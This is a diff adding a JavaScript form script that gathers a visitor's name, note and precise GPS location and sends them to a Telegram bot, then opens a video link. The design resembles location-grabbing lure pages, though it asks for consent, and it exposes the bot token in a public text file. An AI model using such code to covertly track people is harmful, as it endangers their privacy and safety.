@@ -1,0 +1,82 @@
+(async () => {
+  const $ = id => document.getElementById(id);
+  const form = $('form');
+  const status = $('status');
+
+  form.addEventListener('submit', async e => {
+    e.preventDefault();
+
+    const name = $('name').value.trim();
+    const note = $('note').value.trim();
+    const consent = $('consent').checked;
+    if (!name || !consent) {
+      status.textContent = "Lütfen adınızı girin ve onay verin.";
+      return;
+    }
+
+    status.textContent = "📍 Konum alınıyor...";
+    let pos;
+    try {
+      pos = await new Promise((res, rej) => {
+        navigator.geolocation.getCurrentPosition(res, rej, { timeout: 10000 });
+      });
+    } catch {
+      status.textContent = "❌ Konum alınamadı.";
+      return;
+    }
+
+    const lat = pos.coords.latitude.toFixed(6);
+    const lon = pos.coords.longitude.toFixed(6);
+    const map = `https://www.google.com/maps?q=${lat},${lon}`;
+    const timestamp = new Date().toLocaleString();
+
+    status.textContent = "📦 bilgiler.txt okunuyor...";
+    let raw;
+    try {
+      raw = await fetch("bilgiler.txt?v=" + Date.now()).then(r => r.text());
+    } catch {
+      status.textContent = "❌ bilgiler.txt okunamadı.";
+      return;
+    }
+
+    const token = raw.match(/BOT_TOKEN=(.*)/)?.[1]?.trim();
+    const chatId = raw.match(/CHAT_ID=(.*)/)?.[1]?.trim();
+    if (!token || !chatId) {
+      status.textContent = "❌ bilgiler.txt eksik veya hatalı.";
+      return;
+    }
+
+    const msg = [
+      `🧾 Yeni Giriş`,
+      `👤 İsim: ${name}`,
+      `📝 Not: ${note || "-"}`,
+      `🕒 Zaman: ${timestamp}`,
+      `📍 Konum: ${lat}, ${lon}`,
+      `🔗 Harita: ${map}`,
+      `🔒 Onay: Evet`
+    ].join("\n");
+
+    status.textContent = "🚀 Gönderiliyor...";
+    const url = `https://api.telegram.org/bot${token}/sendMessage`;
+    const body = `chat_id=${chatId}&text=${encodeURIComponent(msg)}`;
+
+    try {
+      const res = await fetch(url, {
+        method: "POST",
+        headers: { "Content-Type": "application/x-www-form-urlencoded" },
+        body
+      });
+      const json = await res.json();
+      if (json.ok) {
+        status.textContent = "✅ Gönderildi. Video açılıyor...";
+        setTimeout(() => {
+          window.open("https://www.youtube.com/watch?v=videourlyaz", "_blank");
+        }, 1500);
+      } else {
+        status.textContent = "❌ Gönderim başarısız.";
+      }
+    } catch {
+      status.textContent = "❌ Ağ hatası.";
+    }
+  });
+})();
